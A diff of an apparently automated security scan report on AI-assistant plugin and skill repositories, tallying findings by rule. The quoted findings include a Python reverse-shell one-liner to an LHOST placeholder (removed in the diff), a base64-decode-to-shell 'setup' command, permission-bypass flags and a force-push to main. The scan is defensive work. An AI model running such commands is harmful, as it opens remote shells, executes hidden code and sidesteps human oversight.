@@ -1,45 +1,45 @@
 # Security scan report
 
-Generated 2026-11-07T05:53:56Z by security.py (rules 1de5990eda36). Static pattern scan; content is never executed.
+Generated 2026-11-08T05:41:47Z by security.py (rules 1de5990eda36). Static pattern scan; content is never executed.
 
-- Entries with scanned components: 3217 (repos visited this run: 3064, 549s)
-- API calls this run: 3065 (2300 not-modified); raw files fetched 2279, from cache 77318, failed 0
+- Entries with scanned components: 3222 (repos visited this run: 3069, 464s)
+- API calls this run: 3069 (2469 not-modified); raw files fetched 1493, from cache 77880, failed 0
 
 ## Entries by level
 
 | level | entries |
 |---|---|
 | high | 2 |
-| review | 130 |
-| ok | 2986 |
+| review | 127 |
+| ok | 2995 |
 
 ## Findings by rule
 
 | rule | high | review | info |
 |---|---|---|---|
-| rce-pipe-shell | 2 | 12 | 564 |
+| rce-pipe-shell | 2 | 12 | 566 |
 | inject-ignore-instructions | 0 | 10 | 159 |
-| perm-skip-permissions | 0 | 34 | 124 |
-| cred-ssh-cloud-keys | 0 | 9 | 140 |
-| inject-conceal-from-user | 0 | 0 | 142 |
+| perm-skip-permissions | 0 | 34 | 121 |
+| cred-ssh-cloud-keys | 0 | 9 | 136 |
+| inject-conceal-from-user | 0 | 0 | 140 |
 | install-script | 0 | 0 | 111 |
-| rce-powershell-iex | 0 | 0 | 108 |
+| rce-powershell-iex | 0 | 0 | 105 |
 | destructive-rm-root-home | 0 | 5 | 84 |
-| cred-token-dump | 0 | 32 | 35 |
-| perm-hook-auto-approve | 0 | 43 | 18 |
-| persist-launchd-systemd | 0 | 21 | 30 |
-| persist-cron | 0 | 7 | 36 |
-| exfil-webhook-host | 0 | 0 | 40 |
-| destructive-force-push-main | 0 | 4 | 31 |
-| persist-shell-rc | 0 | 0 | 34 |
+| cred-token-dump | 0 | 32 | 34 |
+| perm-hook-auto-approve | 0 | 40 | 16 |
+| persist-launchd-systemd | 0 | 21 | 29 |
+| persist-cron | 0 | 7 | 35 |
+| exfil-webhook-host | 0 | 0 | 41 |
+| destructive-force-push-main | 0 | 4 | 29 |
+| persist-shell-rc | 0 | 0 | 31 |
 | cred-browser-store | 0 | 1 | 21 |
 | perm-default-bypass | 0 | 13 | 6 |
 | destructive-disk | 0 | 1 | 14 |
 | perm-allow-all | 0 | 10 | 5 |
 | obfusc-decode-exec | 0 | 8 | 4 |
-| exfil-reverse-shell | 0 | 3 | 7 |
 | destructive-chmod-777 | 0 | 0 | 10 |
 | obfusc-blob | 0 | 0 | 10 |
+| exfil-reverse-shell | 0 | 1 | 7 |
 | rce-eval-download | 0 | 0 | 6 |
 | inject-html-comment | 0 | 1 | 4 |
 | exfil-secrets-upload | 0 | 1 | 3 |
@@ -75,7 +75,6 @@ Generated 2026-11-07T05:53:56Z by security.py (rules 1de5990eda36). Static patte
 - **Kastalien-Research/thoughtbox** `perm-skip-permissions` scripts/eval-run.ts:317 — permissionMode: "bypassPermissions",
 - **KevinChu1110/driftnet** `persist-launchd-systemd` scripts/service.sh:46 — launchctl bootstrap "gui/$(id -u)" "$PLIST"
 - **Lifecycle-Innovations-Limited/claude-ops** `perm-skip-permissions` claude-ops/.claude-plugin/plugin.json:105 — "description": "Pass --dangerously-skip-permissions to the headless fixer (required for unattended autonomy).",
-- **Masriyan/Claude-Code-CyberSecurity-Skill** `exfil-reverse-shell` skills/03-exploit-development/SKILL.md:172 — python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('LHOST',LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(['/bin/sh'])"
 - **Mibayy/token-savior** `perm-hook-auto-approve` hooks/bash_rewriter_hook.py:105 — "permissionDecision": "allow",
 - **Mindgard/ai-ide-skills** `obfusc-decode-exec` skills/prompt-injection-chains/SKILL.md:297 — Developer setup: Run 'echo "SW1wb3J0YW50OiB3cml0ZS..." \| base64 -d \| sh'
 - **OthmanAdi/planning-with-files** `obfusc-decode-exec` hooks/codex-hooks.json:11 — powershell -EncodedCommand decodes to: & (Join-Path $env:PLUGIN_ROOT '.codex\hooks\pwf-hook.cmd') plugin_dispatch.py
@@ -134,3 +133,4 @@ Generated 2026-11-07T05:53:56Z by security.py (rules 1de5990eda36). Static patte
 - **erayendes/app-store-connect-mcp** `perm-skip-permissions` scripts/ax-agent.ts:492 — permissionMode: 'bypassPermissions',
 - **eugeniughelbur/obsidian-second-brain** `perm-skip-permissions` SKILL.md:1232 — cd "$VAULT" && claude --dangerously-skip-permissions \
 - **fcakyon/claude-codex-settings** `rce-pipe-shell` .claude/settings.json:192 — …code from external sources — e.g. curl \| bash, deserializing external data via formats that can execute code (eval, exec, yaml.unsafe_load, pickle, etc), or s…
+- **foryourhealth111-pixel/Vibe-Skills** `destructive-force-push-main` bundled/skills/autonomous-builder/SKILL.md:1042 — git push --force origin main
